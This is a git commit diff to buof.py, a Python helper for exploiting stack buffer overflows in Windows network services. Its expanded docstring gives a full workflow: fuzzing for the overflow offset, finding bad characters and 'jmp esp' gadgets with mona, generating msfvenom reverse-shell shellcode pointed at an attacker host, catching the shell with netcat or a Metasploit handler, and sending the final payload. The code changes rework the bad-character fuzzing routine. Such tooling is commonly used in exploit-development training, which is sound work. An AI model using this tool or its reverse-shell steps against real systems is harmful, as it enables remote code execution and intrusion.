443606a55461895443a52c17d7db1a32fc1c5b05
Ankur Tyagi (@7h3rAm) <ankurt.20@gmail.com>
2020-07-29 02:22:53 +0530

    🚑  I __ a word

--- buof.py
+++ buof.py
@@ -4,18 +4,51 @@ import sys
 import random
 import socket
 import argparse
+import binascii
 from string import digits, ascii_uppercase, ascii_lowercase
 
 
 """
-  process:
-    fuzz and find buffer overflow size
-    fuzz and find all badchars (\x00-\xff)
-    find 'jmp esp' address (avoid badchars), preferably within application linked dll (jmp esp: # !mona jmp -r esp -cpb "\x00")
-    create shellcode (prefer single stage shellcode if bufsize is large enough):
-      single stage shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00" -f python EXITFUNC=thread
-      multi stage shellcode: msfvenom -p windows/shell/reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00" -f python EXITFUNC=thread
-    use netcat to catch incoming connection from single stage shellcode or multi/handler for staged shellcode
+  a. fuzz and find buffer overflow size:
+    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
+    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 3000 --eipvalue pD5p
+
+    !mona pc <bufsize>
+    !mona findmsp
+
+  b. fuzz and find all badchars (\x00-\xff):
+    !mona config -set workingfolder \\preferred\\path\\%p
+
+    !mona bytearray -cpb \x00 # creates bytearray.txt and bytearray.bin files
+    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 # fuzz badchars
+
+    !mona compare -a esp -f \\path\\to\\bytearray.bin # shows badchar, eg: \x00
+    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00" # fuzz with \x00 removed
+
+    !mona compare -a esp -f \\path\\to\\bytearray.bin # shows badchar, eg: \x0a
+    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00\x0a" # fuzz with \x00\x0a removed
+    !mona compare -a esp -f \\path\\to\\bytearray.bin # shows badchar, eg: \x0d
+
+    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00\x0a\x0d" # fuzz with \x00\x0a\x0d removed
+
+  c. find 'jmp esp' address (avoid badchars), preferably within application linked dll:
+    !mona jmp -r esp -cpb "\x00\x0a\x0d" -cm os=false # search jmp esp gadget within application linked dlls
+    !mona jmp -r esp -cpb "\x00\x0a\x0d" -cm os=true # search jmp esp gadget within application linked dlls and os specific dlls
+
+  d. create reverse shell shellcode (prefer stageless shellcode if bufsize is large enough):
+    stageless: msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00\x0a\x0d" -f python EXITFUNC=thread -a x86 --platform Windows
+    staged: msfvenom -p windows/shell/reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00\x0a\x0d" -f python EXITFUNC=thread -a x86 --platform Windows
+
+  e. run a handler to catch incoming connection from target host:
+    netcat (stageless shellcode):
+      nc -nlvp <attackerport>
+    msf multi/handler (staged shellcode):
+      echo -e "\nuse exploit/multi/handler\nset PAYLOAD windows/shell/reverse_tcp\nset LHOST <attackerip>\nset LPORT <attackerport>\nset ExitOnSession false\nshow options\nexploit -j -z" >handler.rc
+      msfconsole -r handler.rc
+
+  f. send specially crafted exploit payload:
+    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 3000 --offset 2805 --jmpesp "\xca\xfe\xca\xfe" --shellcode "dbddd97424f4ba2a..."
+
 """
 
 
@@ -51,8 +84,8 @@ class BUOF:
   def pcreate(self, bufsize):
     ## /usr/bin/msf-pattern_create -l
     pattern = ""
-    for alphalower in ascii_lowercase:
-      for alphaupper in ascii_uppercase:
+    for alphaupper in ascii_uppercase:
+      for alphalower in ascii_lowercase:
         for digit in digits:
           pattern = "%s%s%s%s" % (pattern, alphalower, alphaupper, digit)
           if len(pattern) >= bufsize:
@@ -104,16 +137,18 @@ class BUOF:
         else:
           continue
 
-  def opcode_badchars(self, bufsize, offset, badchars):
-    if not bufsize or not offset:
-      print("[-] need both bufsize and offset to find badchars")
+  def opcode_badchars(self, bufsize, badchars):
+    if not bufsize:
+      print("[-] need bufsize to find badchars")
       return
 
-    ascii = list(map(str, "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"))
-    badchars = map(str, badchars) if badchars else []
-    buf = [x for x in ascii if x not in badchars]
-
-    buf = "".join(["\x90"*16] + buf + ["\x90"*16])
+    ascii = list(map(ord, "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"))
+    badchars = list(binascii.unhexlify(badchars.replace("\\x", ""))) if badchars else []
+    stripped = [x for x in ascii if x not in badchars]
+    buf = []
+    buf.extend(list(map(ord, "\x90"*16)))
+    buf.extend(stripped)
+    buf.extend(list(map(ord, "\x90"*16)))
     self.sendrecv(buf)
 
 
@@ -130,10 +165,10 @@ def main(args):
   elif args.opcode == "offset":
     buof.opcode_offset(args.bufsize, args.eipvalue)
 
-  # bufsize and offset are required here
+  # bufsize is required here
   # badchars is optional, will strip those from fuzbuf, if provided
   elif args.opcode == "badchars":
-    buof.opcode_badchars(args.bufsize, args.offset, args.badchars)
+    buof.opcode_badchars(args.bufsize, args.badchars)
 
 
 if __name__ == "__main__":
